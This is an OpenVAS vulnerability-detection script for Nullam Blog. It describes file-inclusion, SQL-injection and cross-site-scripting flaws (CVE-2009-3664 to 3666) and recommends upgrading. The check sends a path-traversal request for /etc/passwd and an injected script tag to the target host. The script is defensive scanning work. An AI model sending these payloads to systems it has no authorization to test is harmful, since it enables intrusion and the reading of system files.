###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_nullam_blog_mult_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# Nullam Blog Multiple Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to disclose sensitive information
  and conduct cross-site scripting and SQL injection attacks.
  Impact Level: System/Application.";
tag_affected = "Nullam Blog version prior to 0.1.3 on Linux.";
tag_insight = "- Input passed to the 'p' and 's' parameter in index.php is not properly
    verified before being used to include files. This can be exploited to
    include arbitrary files from local resources.
  - Input passed to the 'i' and 'v' parameter in index.php is not properly
    sanitised before being used in SQL queries. This can be exploited to
    manipulate SQL queries by injecting arbitrary SQL code.
  - Input passed to the 'e' parameter in index.php is not properly sanitised
    before being returned to the user. This can be exploited to execute
    arbitrary HTML and script code in a user's browser session in the context
    of an affected site.";
tag_solution = "Upgrade to Nullam Blog version 0.1.3
  http://sourceforge.net/projects/nullam/";
tag_summary = "This host is running Nullam Blog and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(900888);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-10-31 09:54:01 +0100 (Sat, 31 Oct 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-3664", "CVE-2009-3665", "CVE-2009-3666");
  script_name("Nullam Blog Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/36648");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9625");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/53217");

  script_description(desc);
  script_summary("Check through a mild verification attack on Nullam Blog");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl", "find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

nullamPort = get_http_port(default:80);
if(!nullamPort){
  nullamPort = 80;
}

if(!get_port_state(nullamPort)){
  exit(0);
}

if(!safe_checks())
{
  foreach dir (make_list("/", "/nullam", "/blog", cgi_dirs()))
  {
    sndReq1 = http_get(item:string(dir, "/index.php"), port:nullamPort);
    rcvRes1 = http_send_recv(port:nullamPort, data:sndReq1);
    if("<title>Nullam</title>" >< rcvRes1 &&
     egrep(pattern:"^HTTP/.* 200 OK",string:rcvRes1))
    {
      foreach item (make_list("s", "p"))
      {
        sndReq2 = http_get(item:string(dir, "/index.php?", item, "=../../.." +
                           "/../../../etc/passwd%00"), port:nullamPort);
        rcvRes2 = http_send_recv(port:nullamPort, data:sndReq2);
        if(egrep(pattern:".*root:.*:0:[01]:.*", string:rcvRes2))
        {
          security_hole(nullamPort);
          exit(0);
        }
      }

      sndReq3 = http_get(item:string(dir, "/index.php?p=error&e=<script>alert" +
                  "('OpenVAS-SQL-Injection-Test');</script>"), port:nullamPort);
      rcvRes3 = http_send_recv(port:nullamPort, data:sndReq3);
      if("<script>alert('OpenVAS-SQL-Injection-Test');</script>" >< rcvRes3)
      {
        security_hole(nullamPort);
        exit(0);
      }
    }
  }
}
